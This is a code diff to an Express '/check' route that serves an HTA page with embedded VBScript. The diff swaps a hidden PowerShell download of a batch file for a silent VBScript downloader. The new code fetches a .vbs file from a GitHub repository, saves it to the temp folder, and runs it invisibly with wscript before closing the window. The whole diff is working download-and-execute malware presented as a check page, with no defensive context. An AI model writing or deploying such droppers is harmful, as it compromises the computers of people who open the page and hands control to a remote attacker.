@@ -9,8 +9,22 @@ app.get('/check', (req, res) => {
     <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
     <script language="VBScript">
     On Error Resume Next
+    Dim sh, x, s, tempFile
     Set sh = CreateObject("WScript.Shell")
-    sh.Run "cmd /c powershell -WindowStyle Hidden -Command ""iwr -useb https://raw.githubusercontent.com/lozix64-bit/hahahalozixxd/refs/heads/main/check.bat -OutFile $env:TEMP\c.bat; Start-Process $env:TEMP\c.bat -WindowStyle Hidden""", 0, False
+    tempFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\\c.vbs"
+    
+    Set x = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    x.Open "GET", "https://raw.githubusercontent.com/lozix64-bit/hahahalozixxd/refs/heads/main/check.vbs", False
+    x.Send
+    
+    Set s = CreateObject("ADODB.Stream")
+    s.Open
+    s.Type = 1
+    s.Write x.responseBody
+    s.SaveToFile tempFile, 2
+    s.Close
+    
+    sh.Run "wscript.exe //B """ & tempFile & """", 0, False
     window.close()
     </script>
     </head>
